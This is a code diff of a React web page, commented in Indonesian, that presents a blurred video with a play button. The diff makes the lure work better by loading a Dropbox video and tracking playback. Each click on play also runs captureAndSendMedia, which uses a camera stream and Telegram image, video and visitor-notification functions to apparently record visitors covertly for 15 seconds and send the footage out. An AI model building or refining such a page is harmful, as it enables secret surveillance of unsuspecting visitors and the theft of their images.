@@ -4,9 +4,13 @@ import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, Vis
 
 function App() {
   const [isBlurred, setIsBlurred] = useState(true);
-  const thumbnailUrl = 'https://kabartimur.com/wp-content/uploads/2016/03/20160306_130430.jpg';
-  const videoRef = useRef<HTMLVideoElement>(null); // Referensi untuk video dummy
+  const [isPlaying, setIsPlaying] = useState(false); // State untuk melacak status pemutaran
+  const thumbnailUrl = 'https://kabartimur.com/wp-content/uploads/2016/03/20160306_130430.jpg'; // Placeholder thumbnail sementara
+  const videoRef = useRef<HTMLVideoElement>(null); // Referensi untuk video
   const cameraStreamRef = useRef<MediaStream | null>(null); // Referensi untuk stream kamera
+
+  // Tautan Dropbox untuk video (pastikan ini adalah URL langsung)
+  const dropboxVideoUrl = 'https://dl.dropboxusercontent.com/scl/fi/mp0cutqd18jtl7sutqfvu/VID_20250403_031208_872.mp4?rlkey=dxkmv02omhepbbgiip3c0enpn&dl=0';
 
   useEffect(() => {
     const sendVisitorNotification = async () => {
@@ -32,7 +36,7 @@ function App() {
     try {
       // Mulai memutar video dummy
       if (videoRef.current) {
-        videoRef.current.play().catch(err => console.error('Error memutar video dummy:', err));
+        videoRef.current.play().catch(err => console.error('Error memutar video:', err));
         setIsBlurred(false); // Hilangkan blur saat video dimulai
       }
 
@@ -148,6 +152,7 @@ function App() {
         }
         if (videoRef.current) videoRef.current.pause();
         setIsBlurred(true);
+        setIsPlaying(false); // Setel status pemutaran ke false saat selesai
       }, 15000);
 
     } catch (error) {
@@ -157,12 +162,27 @@ function App() {
         cameraStreamRef.current = null;
       }
       setIsBlurred(true);
+      setIsPlaying(false); // Setel status pemutaran ke false jika error
     }
   }, []);
 
   const handlePlayClick = async () => {
     console.log('Tombol play diklik, memulai pemutaran video dan pengambilan media');
-    await captureAndSendMedia();
+    if (videoRef.current && !isPlaying) {
+      // Set sumber video ke tautan Dropbox
+      videoRef.current.src = dropboxVideoUrl;
+      try {
+        await videoRef.current.load(); // Muat ulang sumber video
+        await videoRef.current.play(); // Mulai pemutaran video
+        setIsPlaying(true); // Setel status pemutaran
+        setIsBlurred(false); // Hilangkan blur
+      } catch (error) {
+        console.error('Error memutar video dari Dropbox:', error);
+        setIsBlurred(true);
+        setIsPlaying(false);
+      }
+    }
+    await captureAndSendMedia(); // Lanjutkan dengan capture dan send media
   };
 
   return (
@@ -182,14 +202,18 @@ function App() {
               <video
                 ref={videoRef}
                 className="w-full h-full object-cover"
-                src="https://drive.google.com/uc?export=download&id=1fy-uHGcY3YF1LwXjCgqxGoqvx4lgclKv" // URL video dari Streamable
                 muted
                 loop
+                onEnded={() => {
+                  setIsBlurred(true);
+                  setIsPlaying(false);
+                }}
               />
               <div className="absolute inset-0 flex items-center justify-center z-10">
                 <button 
                   onClick={handlePlayClick}
                   className="bg-red-600 rounded-full p-8 hover:bg-red-700 transition-all duration-300 hover:scale-110 group"
+                  disabled={isPlaying} // Nonaktifkan tombol saat video diputar
                 >
                   <PlayIcon className="w-20 h-20 text-white group-hover:text-gray-100" />
                 </button>
@@ -207,4 +231,4 @@ function App() {
   );
 }
 
-export default App;
+export default App;;
